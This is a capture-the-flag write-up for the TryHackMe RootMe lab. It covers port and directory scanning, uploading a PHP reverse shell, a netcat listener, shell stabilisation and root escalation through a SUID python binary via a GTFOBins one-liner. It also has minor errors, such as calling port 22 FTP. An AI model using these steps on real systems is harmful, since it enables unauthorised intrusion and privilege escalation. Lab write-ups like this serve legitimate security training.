@@ -1,0 +1,75 @@
+->CTF Challenge (https://tryhackme.com/room/rrootme): -
+
+1)The IP address provided to us: -
+IP: 10.10.251.234
+
+2)We scan the IP for open ports
+Command: nmap -oN rootme $IP
+
+3)We get the open ports through this. We find out that:
+->Port 22: FTP (Open)
+->Port 80: HTTP (Open)
+
+4)Now, we want to check the version of Apache server running, which is present in HTTP, hence we scan that port for the version
+Command: nmap -oN rootmeHTTP -sV $IP
+
+5)Now, we need to find the hidden directories. Hence we use GoBuster tool.
+Command: gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.251.234/content  dir
+
+6)We find out that /panel directory.
+
+7)After navigating to that directory, we find out that it is allowing us to upload files to that server like we did in DVWA. 
+
+8)Upload pentestmonkey.php to get reverse shell, after changing the the IP of the OpenVPN and port number.
+
+9)After uploading, open the file and net cat the port through the terminal to get the shell.
+Command: nc -lnvp 1334
+
+10)We get the shell. Now, we first stabalize the shell, so that we are able to use Ctrl+C and Ctrl+Z
+->Refer screenshot "Shell Stabalization.png"
+->First we run the python command(Gives us semi-stabalized): python -c "import pty; pty.spawn('/bin/bash');"
+->Then we go back to Kali's terminal by using Ctrl+z
+->Then execute the following commands:-
+	->stty raw -echo ;fg
+	->reset
+	->xterm
+	->export TERM-xterm
+	->export SHELL=bash
+
+11)Now, since we have the stabalized shell, we find the firt flag. We try and find the flag in different directories.
+->Command: whoami ->We find that we are www-data. Hence we go to the directory that has the www file, therefore var.
+Command: cd /var/www
+
+12)We find the first flag here!
+
+13)Now, we have to find the file with SUID permissions.
+(SUID: Set User ID)
+(Has user as __s privileges) (__can be r and w or -)
+(Each system call is executed by a user and each user has a user id)
+(Command to check user id: id)
+(Suppose there are 2 users. One is normal and one is administrator. If normal user is accessing a file that is only allowed to be accessed by the administrator, then it can use sudo, as sudo can change the user id of the normal user's system call to administrator's system call. Hence, the system allows the execution as it thinks that the command is being executed by the administrator.)
+(Binary Files: Executable Files)
+
+14)Since we know that /usr/bin/sudo is a file that has the permission to set user id, therefore, we ls -lah here first.
+Command: ls /usr/bin/sudo -lah
+
+15)Now, it is clear from the submission space in TryHackME type that the file is of the type /usr/bin. Therefore, we check all SUID binary files in /usr/bin.
+Command: ls /usr/bin -lah | grep "rws"
+(grep "rws": To retrieve only those files that have s, that is suid permissions)
+
+15)We find that among the many files present that have suid permissions, there exists a python file, which shouldn't be present as anyone can write their own script and execute through python and can change user id permissions.
+
+16)Therefore, we use that file.
+
+17)Now, we need to modify suid permissions. Therefore we need a command to do that.
+Website: https://gtfobins.github.io/gtfobins/python/#suid
+Command: ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+(The website, gtfobins is a really good website that has a list of binary exploits and commands to use them)
+(For windows binaries, website: https://lolbas-project.github.io/)
+
+18)After executing the above command, we again check the user id. We get 0.
+(User id of root: 0, always!)
+
+19)Hence, we are root. We can also check with command: whoami.
+
+20)Now, we go to the root directory and find the final root flag!
